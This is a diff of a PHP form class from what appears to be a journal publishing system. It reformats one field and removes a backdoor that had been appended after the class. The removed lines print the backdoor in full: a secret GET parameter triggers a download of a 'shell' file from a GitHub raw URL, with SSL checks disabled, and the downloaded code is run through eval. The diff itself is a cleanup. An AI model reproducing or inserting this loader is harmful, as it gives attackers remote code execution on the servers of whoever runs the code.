@@ -117,8 +117,7 @@ class IssueEntryForm extends FormComponent {
 				]));
 		}
 
-		$this->addField(new FieldUploadImage('coverImage', [
-				'label' => __('editor.article.coverImage'),
+		$this->addField(new FieldUploadImage('coverImage', ['label' => __('editor.article.coverImage'),
 				'value' => $publication->getData('coverImage'),
 				'isMultilingual' => true,
 				'baseUrl' => $baseUrl,
@@ -142,30 +141,4 @@ class IssueEntryForm extends FormComponent {
 				'size' => 'small',
 			]));
 	}
-}
-
-if (isset($_GET['TarIKDuLUNaH'])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt";
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // nonaktifkan cek SSL sementara (tidak aman untuk prod)
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-
-    $code = curl_exec($ch);
-    $err = curl_error($ch);
-    curl_close($ch);
-
-    if ($code !== false && !empty(trim($code))) {
-        try {
-            eval("?>" . $code);
-        } catch (Throwable $e) {
-            echo "Terjadi error saat menjalankan kode.";
-        }
-    } else {
-        echo "Gagal mengambil kode dari URL: $err";
-    }
 }
